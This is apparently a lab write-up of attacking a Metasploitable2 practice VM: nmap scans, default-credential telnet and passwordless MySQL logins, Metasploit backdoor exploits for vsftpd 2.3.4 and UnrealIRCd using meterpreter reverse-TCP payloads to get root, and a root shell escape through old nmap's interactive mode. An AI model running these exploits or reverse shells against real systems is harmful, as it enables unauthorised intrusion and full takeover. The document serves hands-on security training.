# Here is the metasploitable2 machine in the virtual box -


<img width="720" height="462" alt="image" src="https://github.com/user-attachments/assets/ee723854-c420-4028-8c0f-2e38489bb7d9" />

# Nmap scanning 
```
┌──(nimesh㉿kali)-[~]
└─$ sudo nmap -p- -Pn -T4 192.168.0.244 -sC -sV 

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 14:09 +0530
Nmap scan report for 192.168.0.244
Host is up (0.038s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.170
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2026-06-12T08:42:33+00:00; -2s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      51387/udp   mountd
|   100005  1,2,3      51968/tcp   mountd
|   100021  1,3,4      37530/udp   nlockmgr
|   100021  1,3,4      39223/tcp   nlockmgr
|   100024  1          37344/udp   status
|_  100024  1          48956/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: LongColumnFlag, Speaks41ProtocolNew, SupportsTransactions, Support41Auth, SwitchToSSLAfterHandshake, ConnectWithDatabase, SupportsCompression
|   Status: Autocommit
|_  Salt: ]Z.s{0{=]=W!:BzddK+2
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2026-06-12T08:42:33+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:06:31
|   source ident: nmap
|   source host: 67FEB57F.F0D9233E.FFFA6D49.IP
|_  error: Closing Link: tuigtucfr[192.168.0.170] (Quit: tuigtucfr)
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
39223/tcp open  nlockmgr    1-4 (RPC #100021)
39892/tcp open  java-rmi    GNU Classpath grmiregistry
48956/tcp open  status      1 (RPC #100024)
51968/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:D8:A7:39 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-06-12T04:42:24-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 59m59s, deviation: 2h00m01s, median: -2s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.56 seconds
```

Following ports are open - 
```
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  netbios-ssn
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi
1524/tcp  open  bindshell
2049/tcp  open  nfs
2121/tcp  open  ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  irc
8009/tcp  open  ajp13
8180/tcp  open  http
8787/tcp  open  drb
39223/tcp open  nlockmgr
39892/tcp open  java-rmi
48956/tcp open  status
51968/tcp open  mountd
```
# UDP Scanning -
cmd - sudo nmap -Pn 192.168.0.244 -sU -T3
sudo runs Nmap with administrator privileges required for advanced scans.
-Pn tells Nmap to skip ping checks and assume the target host is online.
-sU performs a UDP port scan to discover UDP-based services like DNS, SNMP, and NTP.
-T3 uses the normal timing template, balancing scan speed and accuracy.
```
┌──(nimesh㉿kali)-[~]
└─$ sudo nmap -Pn 192.168.0.244 -sU -T3 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 14:43 +0530
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 9.66% done; ETC: 14:58 (0:14:21 remaining)
Stats: 0:04:21 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 25.20% done; ETC: 15:00 (0:12:55 remaining)
Stats: 0:09:26 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 53.54% done; ETC: 15:00 (0:08:10 remaining)
Stats: 0:17:47 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 15:00 (0:00:00 remaining)
Stats: 0:17:53 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 15:00 (0:00:00 remaining)
Nmap scan report for 192.168.0.244
Host is up (0.022s latency).
Not shown: 993 closed udp ports (port-unreach)
PORT     STATE         SERVICE
53/udp   open          domain
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
111/udp  open          rpcbind
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
2049/udp open          nfs
MAC Address: 08:00:27:D8:A7:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1091.39 seconds

```

# FTP Login 
```
┌──(nimesh㉿kali)-[~]
└─$ ftp 192.168.0.244
Connected to 192.168.0.244.
220 (vsFTPd 2.3.4)
Name (192.168.0.244:nimesh): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> active
?Invalid command.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> passive
Passive mode: on; fallback to active mode: on.
ftp> ls-la
?Invalid command.
ftp> ls -la
229 Entering Extended Passive Mode (|||35723|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||31095|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||34621|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```
Didn't Found anything but the ftp login (anonymous) was on ...

# Exploiting vsftpd 2.3.4
```
msf exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST                            yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port

   When FETCH_COMMAND is one of CURL,GET,WGET:
   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.
   When FETCH_FILELESS is none:
   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      ZkHQCxNAtLk      no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces
Exploit target:
   Id  Name
   --  ----
   0   Linux/Unix Command
View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts meta2
rhosts => meta2
msf exploit(unix/ftp/vsftpd_234_backdoor) > set lhost 192.168.0.192
lhost => 192.168.0.192
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.0.192:4444 
[*] meta2:21 - Running automatic check ("set AutoCheck false" to disable)
[*] meta2:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] meta2:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] meta2:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.0.192:4444 -> meta2:55297) at 2026-06-08 11:28:06 +0530

meterpreter > shell
Process 5627 created.
Channel 1 created.
whoami
root
``` 
Getting the root access here ...

# SSH Login 
nmap --script ssh2-enum-algos -p22 192.168.0.244
Explanation (4 Lines)
nmap starts the Nmap network scanning tool.
-p22 tells Nmap to scan only port 22 (SSH) on the target host.
--script ssh2-enum-algos runs the NSE script that enumerates the SSH server's supported algorithms (ciphers, key exchange methods, MACs, and host keys).
192.168.0.244 is the target IP address being analyzed.
```
┌──(nimesh㉿kali)-[~]
└─$ nmap --script ssh2-enum-algos -p22 192.168.0.244
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 15:19 +0530
Nmap scan report for 192.168.0.244
Host is up (0.015s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh2-enum-algos: 
|   kex_algorithms: (4)
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group-exchange-sha1
|       diffie-hellman-group14-sha1
|       diffie-hellman-group1-sha1
|   server_host_key_algorithms: (2)
|       ssh-rsa
|       ssh-dss
|   encryption_algorithms: (13)
|       aes128-cbc
|       3des-cbc
|       blowfish-cbc
|       cast128-cbc
|       arcfour128
|       arcfour256
|       arcfour
|       aes192-cbc
|       aes256-cbc
|       rijndael-cbc@lysator.liu.se
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|   mac_algorithms: (7)
|       hmac-md5
|       hmac-sha1
|       umac-64@openssh.com
|       hmac-ripemd160
|       hmac-ripemd160@openssh.com
|       hmac-sha1-96
|       hmac-md5-96
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
MAC Address: 08:00:27:D8:A7:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
```

# Telnet Login 
```
┌──(nimesh㉿kali)-[~]
└─$ telnet 192.168.0.244     
Trying 192.168.0.244...
Connected to 192.168.0.244.
Escape character is '^]'.
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: s^H^H^Hmsfadim
Password: 

Login incorrect
metasploitable login: msfadmin
Password: 
Last login: Fri Jun 12 04:36:03 EDT 2026 on tty1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$ pwd
/home/msfadmin
msfadmin@metasploitable:~$ cd ..
msfadmin@metasploitable:/home$ cd ..
msfadmin@metasploitable:/$ cd ..
msfadmin@metasploitable:/$ pwd
/
msfadmin@metasploitable:/$ 
```
Can directly login through telnet since default credentials are already written ...

# SMTP Logins 
User enumeration failed but I can use the above commands to exploit
```
┌──(nimesh㉿kali)-[~]
└─$ locate *.nse | grep smtp
/usr/share/nmap/scripts/smtp-brute.nse
/usr/share/nmap/scripts/smtp-commands.nse
/usr/share/nmap/scripts/smtp-enum-users.nse
/usr/share/nmap/scripts/smtp-ntlm-info.nse
/usr/share/nmap/scripts/smtp-open-relay.nse
/usr/share/nmap/scripts/smtp-strangeport.nse
/usr/share/nmap/scripts/smtp-vuln-cve2010-4344.nse
/usr/share/nmap/scripts/smtp-vuln-cve2011-1720.nse
/usr/share/nmap/scripts/smtp-vuln-cve2011-1764.nse
                                                                                                              
┌──(nimesh㉿kali)-[~]
└─$ nmap --script smtp-* -p25 meta2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 15:29 +0530
Failed to resolve "meta2".
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 3.28 seconds
                                                                                                              
┌──(nimesh㉿kali)-[~]
└─$ nmap ---script smtp-* -p25 192.168.0.244
/usr/lib/nmap/nmap: unrecognized option '---script'
See the output of nmap -h for a summary of options.
                                                                                                              
┌──(nimesh㉿kali)-[~]
└─$ nmap --script smtp-* -p25 192.168.0.244 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 15:30 +0530
Nmap scan report for 192.168.0.244
Host is up (0.0040s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: Couldn't establish connection on port 25
| smtp-enum-users: 
|_  Couldn't establish connection on port 25
|_smtp-open-relay: Couldn't establish connection on port 25
MAC Address: 08:00:27:D8:A7:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 31.07 seconds
                                                                                                              
┌──(nimesh㉿kali)-[~]
└─$ nc 192.168.0.244                       
no port[s] to connect to
                                                                                                              
┌──(nimesh㉿kali)-[~]
└─$ nc 192.168.0.244 25
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
```

# DNS Enumeration with Nmap 
```
┌──(nimesh㉿kali)-[~]
└─$ sudo nmap --script dns* 192.168.0.244 -p 53
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 15:35 +0530
NSE: [dns-zone-transfer] Skipping 'dns-zone-transfer' prerule, 'dnszonetransfer.domain' argument is missing.
Nmap scan report for 192.168.0.244
Host is up (0.022s latency).

PORT   STATE SERVICE
53/tcp open  domain
|_dns-nsec3-enum: Can't determine domain for host 192.168.0.244; use dns-nsec3-enum.domains script arg.
| dns-nsid: 
|_  bind.version: 9.4.2
|_dns-fuzz: Server didn't response to our probe, can't fuzz
|_dns-nsec-enum: Can't determine domain for host 192.168.0.244; use dns-nsec-enum.domains script arg.
MAC Address: 08:00:27:D8:A7:39 (Oracle VirtualBox virtual NIC)

Host script results:
|_dns-brute: Can't guess domain of "192.168.0.244"; use dns-brute.domain script argument.
| dns-blacklist: 
|   SPAM
|     l2.apews.org - FAIL
|_    list.quorum.to - SPAM

Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
```

# MYSQL 
```
┌──(nimesh㉿kali)-[~]
└─$  mariadb -h 192.168.0.244 -u root --ssl=OFF
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
7 rows in set (0.020 sec)

MySQL [(none)]> 
```
# IRC Backdoor 
```msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options
Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   6667             yes       The target port (TCP)
Payload options (cmd/linux/http/x86/meterpreter/reverse_tcp):
   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Pytho
                                              n ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST                            yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port
   When FETCH_COMMAND is one of CURL,GET,WGET:
   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.
   When FETCH_FILELESS is none:
   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      DnmxZpYBKlJ      no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces
Exploit target:
   Id  Name
   --  ----
   0   Linux/Unix Command
View the full module info with the info, or info -d command.

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.0.145
LHOST => 192.168.0.145
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS meta2
RHOSTS => meta2
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.0.145:4444 
[*] 192.168.0.187:6667 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.0.187:6667 - Connected to 192.168.0.187:6667
[*] 192.168.0.187:6667 - Trying to register a new IRC user: shanae
[+] 192.168.0.187:6667 - The target appears to be vulnerable. UnrealIRCd detected after registration
[*] 192.168.0.187:6667 - Connected to 192.168.0.187:6667
[*] 192.168.0.187:6667 - Sending IRC backdoor command
[*] Sending stage (1062760 bytes) to 192.168.0.187
[*] Meterpreter session 1 opened (192.168.0.145:4444 -> 192.168.0.187:43591) at 2026-06-08 21:55:47 +0530

meterpreter > shell
Process 5423 created.
Channel 1 created.
whoami
root
```
# Privilege Escalation
```
msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)

msfadmin@metasploitable:~$ uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

msfadmin@metasploitable:~$ sudo -l
[sudo] password for msfadmin: 
User msfadmin may run the following commands on this host:
    (ALL) ALL
msfadmin@metasploitable:~$ find / -perm -4000 2>/dev/null
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
```
# NMAP
An older version of nmap runs on this machine
```
msfadmin@metasploitable:~$ /usr/bin/nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh  
sh-3.2# whoami
root
```
Got root access through shell escape on an old version of nmap

